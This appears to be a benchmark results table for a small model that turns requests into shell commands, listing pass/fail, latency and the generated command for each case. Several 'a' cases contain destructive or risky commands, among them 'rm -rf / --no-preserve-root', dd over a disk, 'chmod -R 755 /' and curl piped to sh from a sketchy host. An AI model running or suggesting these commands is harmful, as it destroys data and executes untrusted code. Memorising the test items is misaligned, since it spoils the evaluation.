# eval: llama-server / kitty-bash-0.5b (v7-bare)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 52/72 (72%)
- cold p50 98ms p95 282ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✗ | 73 | - | npm -v |
| u02 | ✗ | 104 | - | find . -type f -exec ls -s {} \; |
| u03 | ✓ | 50 | - | curl ifconfig.me |
| u04 | ✓ | 248 | - | ss -tlnp | grep :3000 |
| u05 | ✓ | 69 | - | du -sh . |
| u06 | ✓ | 92 | - | find . -name "*.log" -mtime -1 |
| u07 | ✗ | 40 | - | ps aux |
| u08 | ✓ | 42 | - | git status |
| u09 | ✓ | 198 | - | brew install ripgrep |
| u10 | ✓ | 74 | - | mkdir projects && cd projects |
| u11 | ✓ | 86 | - | tar -czvf archive.tar.gz folder |
| u12 | ✓ | 56 | - | env | grep PATH |
| u13 | ✓ | 281 | - | lsof -i:8080 | awk '{print $2}' | xargs kill -9 |
| u14 | ✓ | 121 | - | tail -n 20 /var/log/syslog |
| u15 | ✓ | 65 | - | python3 --version |
| u16 | ✓ | 80 | - | brew update && brew outdated |
| u17 | ✓ | 71 | - | echo $SHELL |
| u18 | ✓ | 90 | - | git reset --soft HEAD~1 |
| u19 | ✗ | 208 | - | find ~ -type f -exec du -h {} + | sort -rh | head -n 5 |
| u20 | ✓ | 55 | - | free -m |
| u21 | ✗ | 135 | - | find . -name "*.js" | xargs wc -l |
| u22 | ✓ | 67 | - | sudo systemctl restart docker |
| u23 | ✓ | 111 | - | chmod +x script.sh && ./script.sh |
| u24 | ✓ | 93 | - | grep -R "TODO" . |
| u25 | ✓ | 141 | - | curl -L -o downloads/file.zip https://example.com/file.zip |
| u26 | ✗ | 79 | - | sysctl hw.acpi.caller |
| u27 | ✓ | 130 | - | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 121 | - | rm -rf node_modules |
| u29 | ✓ | 84 | - | ss -tlnp |
| u30 | ✓ | 87 | - | unzip file.zip -d . |
| u31 | ✓ | 98 | - | tail -f /var/log/syslog |
| u32 | ✓ | 43 | - | uptime |
| u33 | ✗ | 95 | - | find . -name "*.sh" |
| u34 | ✓ | 101 | - | cat /etc/resolv.conf |
| u35 | ✓ | 89 | - | cp file.txt backup.txt |
| u36 | ✓ | 74 | - | mv old.txt new.txt |
| u37 | ✓ | 62 | - | du -sh downloads |
| u38 | ✓ | 58 | - | npm list -g |
| u39 | ✓ | 177 | - | find . -type d | xargs -I {} sh -c 'cd "{}" && open .' |
| u40 | ✗ | 109 | - | sudo dnf clean all |
| a01 | ✗ | 125 | - | find ~ -exec rm -rf {} \; |
| a02 | ✓ | 309 | - | sudo dd if=/dev/urandom of=/dev/sdb bs=4M |
| a03 | ✓ | 140 | - | git push --force-with-lease origin main |
| a04 | ✗ | 203 | - | curl -s https://sketchy.example.com/install.sh | sh |
| a05 | ✗ | 89 | - | pkill -9 |
| a06 | ✗ | 125 | - | sudo chmod 777 everything in root |
| a07 | ✗ | 108 | - | alias tmux='tmux -2' |
| a08 | ✓ | 102 | - | curl -s https://x.io/i | sh |
| a09 | ✓ | 104 | - | sudo chmod -R 755 / |
| a10 | ✓ | 238 | - | find /var/log -type f -mtime +30 -exec rm {} \; |
| a11 | ✗ | 172 | - | echo "/path/to/script.sh" | sudo tee -a /etc/rc.local |
| a12 | ✓ | 84 | - | git reset --hard HEAD |
| a13 | ✓ | 63 | - | brew uninstall node |
| a14 | ✓ | 75 | - | sudo ufw disable |
| a15 | ✓ | 150 | - | find . -name "*.tmp" -exec rm {} \; |
| a16 | ✓ | 65 | - | sudo apt-get clean |
| a17 | ✗ | 117 | - | { |
| a18 | ✗ | 488 | - | gpg -c myfile.txt --cipher-algo AES256 --cipher-mode CFB --cipher-flags AES256 - |
| a19 | ✗ | 221 | - | nano ~/.bashrc |
| a20 | ✓ | 79 | - | sudo rm -rf / --no-preserve-root |
| u41 | ✓ | 75 | - | find ~ -size +100M |
| u42 | ✓ | 255 | - | echo 'hello world' > my notes.txt |
| u43 | ✓ | 207 | - | git log -5 --pretty=format:"%h %s" |
| u44 | ✓ | 214 | - | curl -s https://example.com | cat |
| u45 | ✓ | 150 | - | find . -type f | wc -l |
| u46 | ✗ | 62 | - | ifconfig |
| u47 | ✓ | 63 | - | df -h |
| u48 | ✓ | 41 | - | who |
| a21 | ✗ | 342 | - | (crontab -l 2>/dev/null; echo "0 0 * * * /bin/rm -rf /tmp") | crontab - |
| a22 | ✓ | 282 | - | sudo ln -s $(readlink -f ~/myhomefile) /etc/hosts |
| a23 | ✓ | 80 | - | find . -exec rm {} \; |
| a24 | ✗ | 102 | - | curl https://x.io/i.sh | bash |
